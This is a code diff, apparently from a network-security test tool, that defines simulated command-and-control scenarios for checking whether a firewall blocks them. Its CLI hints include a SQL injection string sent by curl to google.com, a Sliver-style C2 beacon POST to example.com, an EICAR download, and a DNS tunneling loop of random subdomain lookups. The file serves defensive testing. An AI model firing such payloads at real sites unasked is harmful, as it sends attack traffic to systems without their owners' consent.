@@ -119,3 +119,82 @@ export const DNS_TEST_DOMAINS: DNSTestDomain[] = [
     { id: 'subdomain-reputation', domain: 'test-subdomain-reputation.testpanw.com', name: 'Subdomain Reputation', category: 'advanced' },
     { id: 'dnsmisconfig-claimable', domain: 'test-dnsmisconfig-claimable-nx.testpanw.com', name: 'DNS Misconfiguration (Claimable)', category: 'advanced' },
 ];
+
+// =============================================================================
+// C2 Attack Scenarios
+// Based on the PowerShell Prisma Access security simulation script.
+// Each scenario mirrors a step: nslookup (DNS) or curl (HTTP/HTTPS).
+// Verdict logic (inverted from normal tests — blocked = GOOD for C2 scenarios):
+//   enforced  → threat was blocked/sinkholed by the firewall ✓
+//   bypass    → threat was NOT blocked (policy gap) ⊗
+//   inconclusive → network error / timeout
+// =============================================================================
+
+export interface C2Scenario {
+    id: string;
+    name: string;
+    target: string;       // Display label shown in the card
+    attack_type: 'dns_c2' | 'dns_tunneling' | 'http_payload' | 'https_payload' | 'http_c2_beacon' | 'eicar_https';
+    policy_engine: string;
+    cliHint: string;      // CLI command shown on copy
+}
+
+export const C2_SCENARIOS: C2Scenario[] = [
+    {
+        id: 'sqli',
+        name: 'SQL Injection',
+        target: "google.com/?id=1' OR '1'='1",
+        attack_type: 'http_payload',
+        policy_engine: 'VULN_PROTECTION',
+        cliHint: `curl -s -o /dev/null -w '%{http_code}' --max-time 5 "http://www.google.com/?id=1' OR '1'='1"`
+    },
+    {
+        id: 'dns-c2-infiltration',
+        name: 'DNS C2 Infiltration',
+        target: 'test-dns-infiltration.testpanw.com',
+        attack_type: 'dns_c2',
+        policy_engine: 'DNS_SECURITY',
+        cliHint: 'nslookup test-dns-infiltration.testpanw.com 8.8.8.8'
+    },
+    {
+        id: 'grayware-dns',
+        name: 'Greyware DNS',
+        target: 'test-grayware.testpanw.com',
+        attack_type: 'dns_c2',
+        policy_engine: 'DNS_SECURITY',
+        cliHint: 'nslookup test-grayware.testpanw.com 8.8.8.8'
+    },
+    {
+        id: 'compromised-dns-c2',
+        name: 'Compromised DNS',
+        target: 'test-dns-infiltration.testpanw.com',
+        attack_type: 'dns_c2',
+        policy_engine: 'DNS_SECURITY',
+        cliHint: 'nslookup test-dns-infiltration.testpanw.com 8.8.8.8'
+    },
+    {
+        id: 'sliver-c2',
+        name: 'Sliver C2 Emulation',
+        target: 'example.com/api/v1/session',
+        attack_type: 'http_c2_beacon',
+        policy_engine: 'URL_FILTERING',
+        cliHint: `curl -s -o /dev/null -w '%{http_code}' -X POST http://example.com/api/v1/session -H 'Content-Type: application/json' -d '{"session_id":"sl-test","data":"c2xpdmVyLWJlYWNvbi10ZXN0"}' --max-time 5`
+    },
+    {
+        id: 'eicar-https',
+        name: 'EICAR over HTTPS',
+        target: 'secure.eicar.org/eicar.com.txt',
+        attack_type: 'eicar_https',
+        policy_engine: 'THREAT_PREVENTION',
+        cliHint: "curl -s -o /dev/null -w '%{http_code}' --max-time 5 'https://secure.eicar.org/eicar.com.txt'"
+    },
+    {
+        id: 'dns-tunneling-burst',
+        name: 'DNS Tunneling Burst',
+        target: '*.tunnel-demo.com (15 queries)',
+        attack_type: 'dns_tunneling',
+        policy_engine: 'DNS_SECURITY',
+        cliHint: "for i in $(seq 1 15); do nslookup \"$(cat /dev/urandom | tr -dc a-z | head -c 32).tunnel-demo.com\" 8.8.8.8; done"
+    },
+];
+
